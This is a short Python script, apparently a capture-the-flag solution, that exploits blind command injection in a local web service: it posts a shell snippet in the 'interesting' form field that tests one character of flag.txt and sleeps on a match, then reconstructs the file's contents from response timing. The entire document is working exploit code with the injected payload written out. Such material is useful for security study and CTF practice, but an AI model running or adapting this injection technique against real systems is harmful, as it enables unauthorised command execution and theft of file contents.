import requests
import time

flag = ""
url = "http://localhost:80/"
lastc = ""
cind = 1
sleeptime = 5
time_threshold = 3
while lastc != "}":
    for i in range(33, 126):
        data = {
            "interesting": f"if [ $(head -c {cind} flag.txt | tail -c 1) == \"{chr(i)}\" ]; then sleep {sleeptime}; fi"
        }
        p = time.time()
        r = requests.post(url=url, data=data)
        f = time.time()
        if (f - p) > 3:
            lastc = chr(i)
            flag += lastc
            cind += 1
            print(flag)
            break
